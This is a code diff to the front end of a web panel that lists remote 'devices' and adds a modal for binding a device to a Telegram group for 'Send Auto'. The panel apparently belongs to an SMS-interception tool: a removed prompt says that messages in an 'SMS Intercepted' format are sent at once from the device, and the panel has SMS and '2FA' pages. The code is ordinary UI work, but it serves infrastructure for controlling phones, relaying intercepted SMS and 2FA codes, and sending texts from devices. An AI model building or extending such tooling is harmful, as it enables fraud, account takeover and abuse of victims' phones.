@@ -849,6 +849,7 @@
     switchView("detail");
     renderDeviceDetail();
     loadDeviceDetail(id);
+    refreshSendAutoStatus();
   }
 
   function renderDeviceDetail() {
@@ -955,37 +956,105 @@
   $("btnPasteSmsTo").onclick = () => pasteInto("smsTo");
   $("btnPasteSmsMsg").onclick = () => pasteInto("smsMsg");
 
+  async function refreshSendAutoStatus() {
+    const box = $("sendAutoStatus");
+    const offBtn = $("btnSendAutoOff");
+    if (!box || !activeDevice) return;
+    try {
+      const data = await api("/api/telegram/groups?deviceId=" + encodeURIComponent(activeDevice.id));
+      const b = data.binding;
+      if (b) {
+        box.innerHTML =
+          'Send Auto: <b style="color:var(--green)">ON</b> → <b>' +
+          esc(b.title) +
+          "</b> <code>" +
+          esc(b.chatId) +
+          "</code>";
+        show(offBtn, true);
+      } else {
+        box.innerHTML = "Send Auto: <b>OFF</b> — niche se group choose karke ON karo";
+        show(offBtn, false);
+      }
+    } catch (_) {
+      box.innerHTML = "Send Auto: status load nahi hua";
+      show(offBtn, false);
+    }
+  }
+
+  function openSendAutoModal(groups) {
+    const list = $("sendAutoGroupList");
+    list.innerHTML = groups
+      .map((g) => {
+        const boundHere = g.autoSend?.deviceId === activeDevice.id;
+        const boundOther = g.autoSend && !boundHere;
+        return `
+        <div class="modal-card" style="justify-content:space-between;margin-bottom:8px;cursor:pointer" data-pick-chat="${esc(g.chatId)}">
+          <div style="min-width:0;flex:1">
+            <div class="val white">${esc(g.title || g.chatId)}</div>
+            <div class="lbl">${esc(g.type || "group")} · <code>${esc(g.chatId)}</code></div>
+            <div class="lbl" style="margin-top:4px">${
+              boundHere
+                ? '<span style="color:var(--green);font-weight:700">Bound to THIS device</span>'
+                : boundOther
+                  ? "Bound → " + esc(g.autoSend.deviceName || g.autoSend.deviceId)
+                  : "Available"
+            }</div>
+          </div>
+          <button type="button" class="btn btn-sm" data-pick-chat="${esc(g.chatId)}">${boundHere ? "Keep" : "Select"}</button>
+        </div>`;
+      })
+      .join("");
+
+    list.querySelectorAll("[data-pick-chat]").forEach((el) => {
+      el.onclick = async (e) => {
+        e.stopPropagation();
+        const chatId = el.dataset.pickChat;
+        try {
+          await api("/api/telegram/groups/" + encodeURIComponent(chatId) + "/auto-send", {
+            method: "POST",
+            body: JSON.stringify({
+              projectId: activeProjectId,
+              deviceId: activeDevice.id,
+              deviceName: activeDevice.name || activeDevice.id,
+            }),
+          });
+          show("modalSendAuto", false);
+          toast("Send Auto ON");
+          refreshSendAutoStatus();
+        } catch (err) {
+          toast(err.message, true);
+        }
+      };
+    });
+    show("modalSendAuto", true);
+  }
+
   $("btnSendAuto").onclick = async () => {
     if (!activeDevice || !activeProjectId) return;
     try {
       const data = await api("/api/telegram/groups");
       const groups = data.groups || [];
       if (!groups.length) {
-        toast("Pehle Telegram Bot page pe bot connect + group add karo", true);
+        toast("Pehle bot ko group/channel me add karo — Telegram & 2FA page pe auto list aayegi", true);
         return;
       }
-      const labels = groups.map((g, i) =>
-        `${i + 1}. ${g.title} (${g.chatId})` +
-        (g.autoSend?.deviceId === activeDevice.id ? " [THIS DEVICE]" : g.autoSend ? ` → ${g.autoSend.deviceName}` : "")
-      ).join("\n");
-      const pick = prompt(
-        "Send Auto — group number choose karo (is device bind hoga):\n\n" + labels +
-        "\n\n0 = cancel\nYaha SMS Intercepted format aate hi number+msg device se turant send."
-      );
-      if (pick == null || pick === "0" || pick === "") return;
-      const idx = Number(pick) - 1;
-      if (!groups[idx]) return toast("Invalid choice", true);
-      const g = groups[idx];
-      await api("/api/telegram/groups/" + encodeURIComponent(g.chatId) + "/auto-send", {
-        method: "POST",
-        body: JSON.stringify({
-          projectId: activeProjectId,
-          deviceId: activeDevice.id,
-          deviceName: activeDevice.name || activeDevice.id,
-        }),
+      openSendAutoModal(groups);
+    } catch (e) {
+      toast(e.message, true);
+    }
+  };
+
+  $("btnSendAutoOff").onclick = async () => {
+    if (!activeDevice) return;
+    try {
+      await api("/api/telegram/auto-send?deviceId=" + encodeURIComponent(activeDevice.id), {
+        method: "DELETE",
       });
-      toast("Send Auto ON: " + (g.title || g.chatId));
-    } catch (e) { toast(e.message, true); }
+      toast("Send Auto OFF");
+      refreshSendAutoStatus();
+    } catch (e) {
+      toast(e.message, true);
+    }
   };
 
   async function loadTelegramBot() {
@@ -1013,23 +1082,23 @@
       }
       const groups = info.groups || [];
       if (!groups.length) {
-        box.innerHTML = '<div class="empty">No groups — bot ko group me add karo ya manual ID daalo</div>';
+        box.innerHTML = '<div class="empty">Abhi koi group nahi — bot ko group/channel me <b>Add</b> karo. Name + ID yahan auto aa jayega.</div>';
         return;
       }
       box.innerHTML = groups.map((g) => `
-        <div class="modal-card" style="margin-bottom:8px;justify-content:space-between">
-          <div>
-            <div class="val white">${esc(g.title)}</div>
-            <div class="lbl">${esc(g.type)} · <code>${esc(g.chatId)}</code></div>
+        <div class="modal-card" style="margin-bottom:8px;justify-content:space-between;gap:10px;flex-wrap:wrap">
+          <div style="min-width:0;flex:1">
+            <div class="val white">${esc(g.title || "Untitled")}</div>
+            <div class="lbl">${esc(g.type || "group")} · <code>${esc(g.chatId)}</code></div>
             <div class="lbl" style="margin-top:4px">${
               g.autoSend
-                ? "Auto → " + esc(g.autoSend.deviceName || g.autoSend.deviceId)
-                : "Auto send: off"
+                ? '<span style="color:var(--green);font-weight:700">Auto ON → ' + esc(g.autoSend.deviceName || g.autoSend.deviceId) + "</span>"
+                : "Auto send: OFF"
             }</div>
           </div>
-          <div style="display:flex;gap:6px;flex-direction:column">
-            ${g.autoSend ? `<button class="btn btn-sm btn-outline" data-tg-unbind="${esc(g.chatId)}">Unbind</button>` : ""}
-            <button class="btn btn-sm btn-danger" data-tg-del="${esc(g.chatId)}">Delete</button>
+          <div style="display:flex;gap:6px;flex-wrap:wrap">
+            ${g.autoSend ? `<button class="btn btn-sm btn-danger" data-tg-unbind="${esc(g.chatId)}">Turn OFF</button>` : ""}
+            <button class="btn btn-sm btn-outline" data-tg-del="${esc(g.chatId)}">Remove</button>
           </div>
         </div>
       `).join("");
@@ -1048,7 +1117,7 @@
             await api("/api/telegram/groups/" + encodeURIComponent(b.dataset.tgUnbind) + "/auto-send", {
               method: "DELETE",
             });
-            toast("Unbound");
+            toast("Send Auto OFF");
             loadTelegramBot();
           } catch (e) { toast(e.message, true); }
         };
@@ -1058,6 +1127,14 @@
       box.innerHTML = '<div class="empty">' + esc(e.message) + "</div>";
     }
   }
+
+  $("btnTgRefreshGroups").onclick = async () => {
+    try {
+      const r = await api("/api/telegram/groups/refresh", { method: "POST", body: "{}" });
+      toast("Updated " + (r.updated || 0) + " group name(s)");
+      loadTelegramBot();
+    } catch (e) { toast(e.message, true); }
+  };
 
   $("btnSave2fa").onclick = async () => {
     try {
@@ -1123,6 +1200,7 @@
       t.classList.add("active");
       show("panelSms", t.dataset.panel === "sms");
       show("panelSend", t.dataset.panel === "send");
+      if (t.dataset.panel === "send") refreshSendAutoStatus();
     };
   });
 
